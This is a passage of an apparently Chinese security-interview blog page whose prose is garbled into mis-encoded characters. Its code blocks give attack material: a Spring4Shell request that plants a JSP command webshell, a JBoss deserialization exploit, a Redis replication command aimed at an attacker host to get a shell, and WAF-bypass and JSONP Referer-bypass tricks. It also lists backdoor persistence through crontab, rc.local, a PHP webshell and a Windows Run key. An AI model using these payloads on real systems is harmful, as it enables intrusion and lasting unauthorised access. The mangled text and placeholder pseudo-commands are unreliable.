è¯·æ±‚åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚æ¼æ´çš„å…³é”®ç‚¹åœ¨äº Spring æ¡†æ¶å¯¹åµŒå¥—å±æ€§çš„è§£æï¼Œç‰¹åˆ«æ˜¯é€šè¿‡ <code>BeanWrapperImpl</code> å¯¹è±¡çš„å±æ€§è®¿é—®å’Œè®¾ç½®ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸€æœºåˆ¶ï¼Œé€šè¿‡æ„é€ æ¶æ„çš„å‚æ•°é“¾ï¼Œæœ€ç»ˆè°ƒç”¨ <code>AccessLogValve.setPattern</code> æ–¹æ³•ï¼Œå°†æ¶æ„ä»£ç å†™å…¥æ—¥å¿—æ–‡ä»¶å¹¶æ‰§è¡Œã€‚</p><h4 id="æ£€æµ‹"><a href="#æ£€æµ‹" class="headerlink" title="æ£€æµ‹"></a>æ£€æµ‹</h4><ul><li><strong>è‡ªåŠ¨åŒ–å·¥å…·</strong>ï¼šä½¿ç”¨å¦‚ <code>spring4shell-scan</code> è¿™æ ·çš„å·¥å…·è¿›è¡Œæ£€æµ‹ã€‚è¯¥å·¥å…·é€šè¿‡å‘é€ç‰¹åˆ¶çš„ HTTP è¯·æ±‚å¹¶åˆ†æå“åº”æ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ¼æ´ã€‚</li><li><strong>æ‰‹åŠ¨æ£€æµ‹</strong>ï¼šé€šè¿‡æ„é€  POCï¼ˆProof of Conceptï¼‰è¯·æ±‚ï¼Œè§‚å¯ŸæœåŠ¡å™¨å“åº”æ˜¯å¦åŒ…å«é¢„æœŸçš„è¾“å‡ºã€‚</li></ul><h4 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h4><ul><li><strong>POC ç¤ºä¾‹</strong>ï¼š<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://target.com&quot;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;suffix&quot;</span>: <span class="string">&quot;%&gt;//&quot;</span>,</span><br><span class="line">    <span class="string">&quot;c1&quot;</span>: <span class="string">&quot;Runtime&quot;</span>,</span><br><span class="line">    <span class="string">&quot;c2&quot;</span>: <span class="string">&quot;&lt;%&quot;</span>,</span><br><span class="line">    <span class="string">&quot;DNT&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">data = <span class="string">&quot;class.module.classLoader.resources.context.parent.pipeline.first.pattern=%&#123;c2&#125;i if(&#x27;j&#x27;.equals(request.getParameter(&#x27;pwd&#x27;)))&#123; java.io.InputStream in = %&#123;c1&#125;i.getRuntime().exec(request.getParameter(&#x27;cmd&#x27;)).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125; &#125; %&#123;suffix&#125;i&quot;</span></span><br><span class="line"></span><br><span class="line">response = requests.post(url, headers=headers, data=data)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure></li></ul><h3 id="å®‰å“ç³»ç»Ÿå¦‚ä½•è¿›è¡Œ-RCE"><a href="#å®‰å“ç³»ç»Ÿå¦‚ä½•è¿›è¡Œ-RCE" class="headerlink" title="å®‰å“ç³»ç»Ÿå¦‚ä½•è¿›è¡Œ RCE"></a>å®‰å“ç³»ç»Ÿå¦‚ä½•è¿›è¡Œ RCE</h3><h4 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h4><ol><li><strong>åº”ç”¨æ¼æ´</strong>ï¼šåˆ©ç”¨å®‰å“åº”ç”¨ä¸­çš„æ¼æ´ï¼Œå¦‚æœªæ­£ç¡®éªŒè¯è¾“å…¥ã€æœªåŠ å¯†æ•æ„Ÿæ•°æ®ç­‰ã€‚</li><li><strong>ç³»ç»Ÿæ¼æ´</strong>ï¼šåˆ©ç”¨å®‰å“ç³»ç»Ÿæœ¬èº«çš„æ¼æ´ï¼Œå¦‚ Stagefright æ¼æ´ã€‚</li><li><strong>ç¬¬ä¸‰æ–¹åº“æ¼æ´</strong>ï¼šåˆ©ç”¨åº”ç”¨ä¸­ä½¿ç”¨çš„ç¬¬ä¸‰æ–¹åº“çš„æ¼æ´ã€‚</li><li><strong>ç¤¾ä¼šå·¥ç¨‹å­¦</strong>ï¼šé€šè¿‡è¯±å¯¼ç”¨æˆ·å®‰è£…æ¶æ„åº”ç”¨æˆ–ç‚¹å‡»æ¶æ„é“¾æ¥ã€‚</li></ol><h4 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h4><ul><li><strong>åˆ©ç”¨ Stagefright æ¼æ´</strong>ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å‘é€ç‰¹åˆ¶çš„ MP4 æ–‡ä»¶åˆ°ç›®æ ‡è®¾å¤‡</span></span><br><span class="line">send_exploit.mp4 to target_device</span><br></pre></td></tr></table></figure></li></ul><h3 id="ç§»åŠ¨ç«¯-App-æœåŠ¡ç«¯æ˜¯-Cloud-ç¯å¢ƒçš„åˆ©ç”¨æ€è·¯"><a href="#ç§»åŠ¨ç«¯-App-æœåŠ¡ç«¯æ˜¯-Cloud-ç¯å¢ƒçš„åˆ©ç”¨æ€è·¯" class="headerlink" title="ç§»åŠ¨ç«¯ App æœåŠ¡ç«¯æ˜¯ Cloud ç¯å¢ƒçš„åˆ©ç”¨æ€è·¯"></a>ç§»åŠ¨ç«¯ App æœåŠ¡ç«¯æ˜¯ Cloud ç¯å¢ƒçš„åˆ©ç”¨æ€è·¯</h3><ol><li><strong>API æ¼æ´</strong>ï¼šæ£€æŸ¥ API ç«¯ç‚¹æ˜¯å¦å­˜åœ¨æœªæˆæƒè®¿é—®ã€SQL æ³¨å…¥ç­‰æ¼æ´ã€‚</li><li><strong>é…ç½®é”™è¯¯</strong>ï¼šæ£€æŸ¥äº‘æœåŠ¡é…ç½®æ˜¯å¦å®‰å…¨ï¼Œå¦‚å­˜å‚¨æ¡¶æƒé™ã€API å¯†é’¥ç­‰ã€‚</li><li><strong>ä¸­é—´ä»¶æ¼æ´</strong>ï¼šåˆ©ç”¨äº‘æœåŠ¡ä¸­çš„ä¸­é—´ä»¶æ¼æ´ï¼Œå¦‚ Spring4Shellã€‚</li><li><strong>ç¤¾ä¼šå·¥ç¨‹å­¦</strong>ï¼šé€šè¿‡ç¤¾ä¼šå·¥ç¨‹å­¦è·å–ç®¡ç†å‘˜å‡­è¯ã€‚</li></ol><h4 id="ç¤ºä¾‹-1"><a href="#ç¤ºä¾‹-1" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h4><ul><li><strong>æ£€æŸ¥ API ç«¯ç‚¹</strong>ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET http://api.cloudservice.com/data</span><br></pre></td></tr></table></figure></li></ul><h3 id="Shiro-å¦‚ä½•ç»•-WAF"><a href="#Shiro-å¦‚ä½•ç»•-WAF" class="headerlink" title="Shiro å¦‚ä½•ç»• WAF"></a>Shiro å¦‚ä½•ç»• WAF</h3><h4 id="æ€è·¯-1"><a href="#æ€è·¯-1" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h4><ol><li><strong>ç¼–ç æ··æ·†</strong>ï¼šå¯¹è¯·æ±‚è¿›è¡Œ URL ç¼–ç æˆ– Base64 ç¼–ç ã€‚</li><li><strong>æ‹†åˆ†è¯·æ±‚</strong>ï¼šå°†æ¶æ„è¯·æ±‚æ‹†åˆ†ä¸ºå¤šä¸ªéƒ¨åˆ†ï¼Œåˆ†åˆ«å‘é€ã€‚</li><li><strong>åè®®ç‰¹æ€§</strong>ï¼šåˆ©ç”¨ HTTP å¤´æˆ– Cookie å‚æ•°æ³¨å…¥ã€‚</li></ol><h4 id="ç¤ºä¾‹-2"><a href="#ç¤ºä¾‹-2" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h4><ul><li><strong>ç¼–ç æ··æ·†</strong>ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H <span class="string">&quot;Authorization: Basic <span class="subst">$(echo -n <span class="string">&quot;admin:<span class="subst">$(python -c &#x27;print <span class="string">&quot;malicious_code&quot;</span>.encode(<span class="string">&quot;base64&quot;</span>)</span>&#x27;)&quot;</span>)</span>&quot;</span> http://target.com</span><br></pre></td></tr></table></figure></li></ul><h3 id="Weblogic-æ‰“ç«™é‡åˆ°-WAF-çš„æ“ä½œ"><a href="#Weblogic-æ‰“ç«™é‡åˆ°-WAF-çš„æ“ä½œ" class="headerlink" title="Weblogic æ‰“ç«™é‡åˆ° WAF çš„æ“ä½œ"></a>Weblogic æ‰“ç«™é‡åˆ° WAF çš„æ“ä½œ</h3><h4 id="æ€è·¯-2"><a href="#æ€è·¯-2" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h4><ol><li><strong>è¯·æ±‚æ··æ·†</strong>ï¼šå¯¹è¯·æ±‚è¿›è¡Œç¼–ç æˆ–æ‹†åˆ†ã€‚</li><li><strong>ç»•è¿‡è§„åˆ™</strong>ï¼šåˆ©ç”¨ WAF çš„è§„åˆ™æ¼æ´ï¼Œå¦‚å¤§å°å†™æ•æ„Ÿã€ç‰¹æ®Šå­—ç¬¦è¿‡æ»¤ä¸ä¸¥ç­‰ã€‚</li><li><strong>ä»£ç†è½¬å‘</strong>ï¼šé€šè¿‡ä»£ç†æœåŠ¡å™¨è½¬å‘è¯·æ±‚ï¼Œé¿å… IP è¢«å°ç¦ã€‚</li></ol><h4 id="ç¤ºä¾‹-3"><a href="#ç¤ºä¾‹-3" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h4><ul><li><strong>ä½¿ç”¨ä»£ç†</strong>ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains curl -X POST -d <span class="string">&quot;payload&quot;</span> http://target.com</span><br></pre></td></tr></table></figure></li></ul><h3 id="Jboss-ååºåˆ—åŒ–åŸç†"><a href="#Jboss-ååºåˆ—åŒ–åŸç†" class="headerlink" title="Jboss ååºåˆ—åŒ–åŸç†"></a>Jboss ååºåˆ—åŒ–åŸç†</h3><h4 id="åŸç†-1"><a href="#åŸç†-1" class="headerlink" title="åŸç†"></a>åŸç†</h4><p>Jboss ä½¿ç”¨ Java çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–æœºåˆ¶æ¥ä¼ è¾“å¯¹è±¡ã€‚æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„åºåˆ—åŒ–å¯¹è±¡ï¼Œé€šè¿‡ååºåˆ—åŒ–è§¦å‘æ¼æ´ï¼Œæ‰§è¡Œä»»æ„ä»£ç ã€‚</p><h4 id="åˆ©ç”¨-1"><a href="#åˆ©ç”¨-1" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h4><ul><li><strong>POC ç¤ºä¾‹</strong>ï¼š<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JbossExploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(<span class="keyword">new</span> <span class="title class_">MaliciousObject</span>());</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] payload = baos.toByteArray();</span><br><span class="line">        <span class="comment">// å‘é€ payload åˆ° Jboss æœåŠ¡å™¨</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MaliciousObject</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        ois.defaultReadObject();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="Redis-æ”»å‡»ã€ä¸»ä»å¤åˆ¶åˆ©ç”¨æ¡ä»¶åŠåŸç†"><a href="#Redis-æ”»å‡»ã€ä¸»ä»å¤åˆ¶åˆ©ç”¨æ¡ä»¶åŠåŸç†" class="headerlink" title="Redis æ”»å‡»ã€ä¸»ä»å¤åˆ¶åˆ©ç”¨æ¡ä»¶åŠåŸç†"></a>Redis æ”»å‡»ã€ä¸»ä»å¤åˆ¶åˆ©ç”¨æ¡ä»¶åŠåŸç†</h3><h4 id="æ”»å‡»æ–¹æ³•"><a href="#æ”»å‡»æ–¹æ³•" class="headerlink" title="æ”»å‡»æ–¹æ³•"></a>æ”»å‡»æ–¹æ³•</h4><ol><li><strong>æœªæˆæƒè®¿é—®</strong>ï¼šç›´æ¥è¿æ¥åˆ° Redis æœåŠ¡å™¨ï¼Œæ‰§è¡Œå‘½ä»¤ã€‚</li><li><strong>ä¸»ä»å¤åˆ¶</strong>ï¼šé€šè¿‡é…ç½®ä»èŠ‚ç‚¹ï¼Œè·å–ä¸»èŠ‚ç‚¹çš„æ•°æ®ã€‚</li></ol><h4 id="ä¸»ä»å¤åˆ¶åŸç†"><a href="#ä¸»ä»å¤åˆ¶åŸç†" class="headerlink" title="ä¸»ä»å¤åˆ¶åŸç†"></a>ä¸»ä»å¤åˆ¶åŸç†</h4><ul><li><strong>æ¡ä»¶</strong>ï¼šä»èŠ‚ç‚¹éœ€è¦èƒ½å¤Ÿè¿æ¥åˆ°ä¸»èŠ‚ç‚¹ï¼Œå¹¶ä¸”ä¸»èŠ‚ç‚¹å…è®¸å¤åˆ¶è¯·æ±‚ã€‚</li><li><strong>åŸç†</strong>ï¼šä»èŠ‚ç‚¹å‘é€ <code>SLAVEOF</code> å‘½ä»¤åˆ°ä¸»èŠ‚ç‚¹ï¼Œä¸»èŠ‚ç‚¹å°†æ•°æ®åŒæ­¥åˆ°ä»èŠ‚ç‚¹ã€‚</li></ul><h4 id="åˆ©ç”¨-2"><a href="#åˆ©ç”¨-2" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h4><ul><li><strong>è·å– Shell</strong>ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h target_host -p 6379 SLAVEOF attacker_host 6379</span><br></pre></td></tr></table></figure></li></ul><h3 id="TCP-å’Œ-UDP-ä¸å‡ºç½‘çš„ä»£ç†ç­–ç•¥"><a href="#TCP-å’Œ-UDP-ä¸å‡ºç½‘çš„ä»£ç†ç­–ç•¥" class="headerlink" title="TCP å’Œ UDP ä¸å‡ºç½‘çš„ä»£ç†ç­–ç•¥"></a>TCP å’Œ UDP ä¸å‡ºç½‘çš„ä»£ç†ç­–ç•¥</h3><h4 id="ç­–ç•¥"><a href="#ç­–ç•¥" class="headerlink" title="ç­–ç•¥"></a>ç­–ç•¥</h4><ol><li><strong>HTTP ä»£ç†</strong>ï¼šé€šè¿‡ HTTP ä»£ç†è½¬å‘è¯·æ±‚ã€‚</li><li><strong>SOCKS ä»£ç†</strong>ï¼šä½¿ç”¨ SOCKS ä»£ç†è¿›è¡Œæµé‡è½¬å‘ã€‚</li><li><strong>éš§é“æŠ€æœ¯</strong>ï¼šä½¿ç”¨éš§é“æŠ€æœ¯å¦‚ SSH éš§é“ã€‚</li></ol><h4 id="ç¤ºä¾‹-4"><a href="#ç¤ºä¾‹-4" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h4><ul><li><strong>SSH éš§é“</strong>ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -D 1080 user@attacker_host</span><br></pre></td></tr></table></figure></li></ul><h2 id="ç™¾åº¦"><a href="#ç™¾åº¦" class="headerlink" title="ç™¾åº¦"></a>ç™¾åº¦</h2><h3 id="JSONP-åŸç†åŠç»•è¿‡æ–¹æ³•"><a href="#JSONP-åŸç†åŠç»•è¿‡æ–¹æ³•" class="headerlink" title="JSONP åŸç†åŠç»•è¿‡æ–¹æ³•"></a>JSONP åŸç†åŠç»•è¿‡æ–¹æ³•</h3><h4 id="JSONP-åŸç†"><a href="#JSONP-åŸç†" class="headerlink" title="JSONP åŸç†"></a>JSONP åŸç†</h4><p>JSONPï¼ˆJSON with Paddingï¼‰æ˜¯ä¸€ç§ç”¨äºè§£å†³è·¨åŸŸè¯·æ±‚çš„æŠ€æœ¯ã€‚å®ƒåˆ©ç”¨äº† <code>&lt;script&gt;</code> æ ‡ç­¾çš„ src å±æ€§ä¸å—åŒæºç­–ç•¥é™åˆ¶çš„ç‰¹æ€§ï¼Œé€šè¿‡åŠ¨æ€åˆ›å»º <code>&lt;script&gt;</code> æ ‡ç­¾æ¥è¯·æ±‚æ•°æ®ï¼Œå¹¶ä»¥å›è°ƒå‡½æ•°çš„å½¢å¼å¤„ç†å“åº”ã€‚</p><h4 id="JSONP-ç»•è¿‡æ–¹æ³•"><a href="#JSONP-ç»•è¿‡æ–¹æ³•" class="headerlink" title="JSONP ç»•è¿‡æ–¹æ³•"></a>JSONP ç»•è¿‡æ–¹æ³•</h4><ol><li><p><strong>Referer è¿‡æ»¤ä¸ä¸¥è°¨</strong>ï¼š</p><ul><li>æ”»å‡»è€…å¯ä»¥æ„é€  URL æ¥ç»•è¿‡ Referer éªŒè¯ï¼Œä¾‹å¦‚åˆ©ç”¨ Referer ä¸­çš„å…³é”®å­—ã€‚</li><li>ç¤ºä¾‹ï¼š<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://aphp.test/jsonp/test_jsonp.php?callback=jsonCallback&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>ç©º Referer ç»•è¿‡</strong>ï¼š</p><ul><li>åˆ©ç”¨ <code>&lt;meta&gt;</code> æ ‡ç­¾æˆ– <code>iframe</code> æ ‡ç­¾è°ƒç”¨ JavaScript ä¼ªåè®®æ¥å®ç°ç©º Referer ç»•è¿‡ã€‚</li><li>ç¤ºä¾‹ï¼š<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;referrer&quot;</span> <span class="attr">content</span>=<span class="string">&quot;never&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://aphp.test/jsonp/test_jsonp.php?callback=jsonCallback&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>Callback å¯å®šä¹‰å¯¼è‡´çš„å®‰å…¨é—®é¢˜</strong>ï¼š</p><ul><li>å¦‚æœ Callback å‡½æ•°åæ²¡æœ‰ä¸¥æ ¼è¿‡æ»¤ï¼Œå¯èƒ½å¯¼è‡´ XSS æ”»å‡»ã€‚</li><li>ç¤ºä¾‹ï¼š<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$callback</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;callback&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$callback</span>.<span class="string">&quot;(&#123;\&quot;data\&quot;:\&quot;value\&quot;&#125;)&quot;</span>;</span><br></pre></td></tr></table></figure></li></ul></li></ol><h3 id="DOMå‹XSSæ‰«æå™¨ç¼–å†™"><a href="#DOMå‹XSSæ‰«æå™¨ç¼–å†™" class="headerlink" title="DOMå‹XSSæ‰«æå™¨ç¼–å†™"></a>DOMå‹XSSæ‰«æå™¨ç¼–å†™</h3><h4 id="åŸºæœ¬æ€è·¯"><a href="#åŸºæœ¬æ€è·¯" class="headerlink" title="åŸºæœ¬æ€è·¯"></a>åŸºæœ¬æ€è·¯</h4><p>DOMå‹XSSæ‰«æå™¨éœ€è¦æ£€æµ‹é¡µé¢ä¸­çš„åŠ¨æ€è¡Œä¸ºï¼Œç‰¹åˆ«æ˜¯äº‹ä»¶å±æ€§å’Œç”¨æˆ·äº¤äº’ã€‚å¯ä»¥é€šè¿‡è‡ªåŠ¨åŒ–æµ‹è¯•å·¥å…·æˆ–æ‰‹åŠ¨æ£€æµ‹æ¥å‘ç°æ½œåœ¨çš„XSSæ¼æ´ã€‚</p><h4 id="å®ç°æ­¥éª¤"><a href="#å®ç°æ­¥éª¤" class="headerlink" title="å®ç°æ­¥éª¤"></a>å®ç°æ­¥éª¤</h4><ol><li><p><strong>æ£€æµ‹äº‹ä»¶å±æ€§</strong>ï¼š</p><ul><li>éå†é¡µé¢ä¸­çš„æ‰€æœ‰å…ƒç´ ï¼Œæ£€æµ‹ <code>onclick</code>ã€<code>onmouseover</code> ç­‰äº‹ä»¶å±æ€§ã€‚</li><li>ç¤ºä¾‹ï¼š<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> elements = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;*&#x27;</span>);</span><br><span class="line">elements.<span class="title function_">forEach</span>(<span class="function"><span class="params">element</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> attributes = element.<span class="property">attributes</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; attributes.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">const</span> attr = attributes[i];</span><br><span class="line">        <span class="keyword">if</span> (attr.<span class="property">name</span>.<span class="title function_">startsWith</span>(<span class="string">&#x27;on&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Element: <span class="subst">$&#123;element.tagName&#125;</span>, Event: <span class="subst">$&#123;attr.name&#125;</span>, Value: <span class="subst">$&#123;attr.value&#125;</span>`</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>åŠ¨æ€è§¦å‘äº‹ä»¶</strong>ï¼š</p><ul><li>ä½¿ç”¨è‡ªåŠ¨åŒ–æµ‹è¯•åº“ï¼ˆå¦‚ Seleniumï¼‰æ¨¡æ‹Ÿç”¨æˆ·ç‚¹å‡»ã€é¼ æ ‡ç§»åŠ¨ç­‰è¡Œä¸ºï¼Œè§‚å¯Ÿæ˜¯å¦æœ‰XSSæ¼æ´ã€‚</li><li>ç¤ºä¾‹ï¼ˆSeleniumï¼‰ï¼š<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line">driver = webdriver.Chrome()</span><br><span class="line">driver.get(<span class="string">&#x27;http://example.com&#x27;</span>)</span><br><span class="line">element = driver.find_element_by_id(<span class="string">&#x27;vulnerable_element&#x27;</span>)</span><br><span class="line">element.click()</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>äººå·¥åˆ¤æ–­</strong>ï¼š</p><ul><li>ç»“åˆè‡ªåŠ¨åŒ–æ£€æµ‹ç»“æœï¼Œäººå·¥åˆ†ææ½œåœ¨çš„XSSæ¼æ´ï¼Œç¡®è®¤æ˜¯å¦å­˜åœ¨å®é™…é£é™©ã€‚</li></ul></li></ol><h3 id="Linuxä¸»æœºç•™åé—¨çš„å„ç§æ–¹å¼"><a href="#Linuxä¸»æœºç•™åé—¨çš„å„ç§æ–¹å¼" class="headerlink" title="Linuxä¸»æœºç•™åé—¨çš„å„ç§æ–¹å¼"></a>Linuxä¸»æœºç•™åé—¨çš„å„ç§æ–¹å¼</h3><h4 id="è®¡åˆ’ä»»åŠ¡"><a href="#è®¡åˆ’ä»»åŠ¡" class="headerlink" title="è®¡åˆ’ä»»åŠ¡"></a>è®¡åˆ’ä»»åŠ¡</h4><ul><li><strong>crontab</strong>ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">crontab -e</span><br><span class="line"><span class="comment"># æ·»åŠ ä»¥ä¸‹å†…å®¹</span></span><br><span class="line">* * * * * /path/to/malicious_script.sh</span><br></pre></td></tr></table></figure></li></ul><h4 id="è‡ªå¯åŠ¨åé—¨"><a href="#è‡ªå¯åŠ¨åé—¨" class="headerlink" title="è‡ªå¯åŠ¨åé—¨"></a>è‡ªå¯åŠ¨åé—¨</h4><ul><li><strong>rc.local</strong>ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/path/to/malicious_script.sh&quot;</span> &gt;&gt; /etc/rc.local</span><br></pre></td></tr></table></figure></li></ul><h4 id="Webshell"><a href="#Webshell" class="headerlink" title="Webshell"></a>Webshell</h4><ul><li><strong>ä¸Šä¼  Webshell</strong>ï¼š<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="å†™æ³¨å†Œè¡¨ï¼ˆWindowsï¼‰"><a href="#å†™æ³¨å†Œè¡¨ï¼ˆWindowsï¼‰" class="headerlink" title="å†™æ³¨å†Œè¡¨ï¼ˆWindowsï¼‰"></a>å†™æ³¨å†Œè¡¨ï¼ˆWindowsï¼‰</h4><ul><li><strong>æ³¨å†Œè¡¨å¯åŠ¨é¡¹</strong>ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add <span class="string">&quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Run&quot;</span> /v Malicious /t REG_SZ /d <span class="string">&quot;C:\path\to\malicious.exe&quot;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="DNSéš§é“æ­å»ºæ–¹å¼"><a href="#DNSéš§é“æ­å»ºæ–¹å¼" class="headerlink" title="DNSéš§é“æ­å»ºæ–¹å¼"></a>DNSéš§é“æ­å»ºæ–¹å¼</h3><h4 id="åŸºæœ¬åŸç†"><a href="#åŸºæœ¬åŸç†" class="headerlink" title="åŸºæœ¬åŸç†"></a>åŸºæœ¬åŸç†</h4><p>DNSéš§é“åˆ©ç”¨DNSåè®®ä¼ 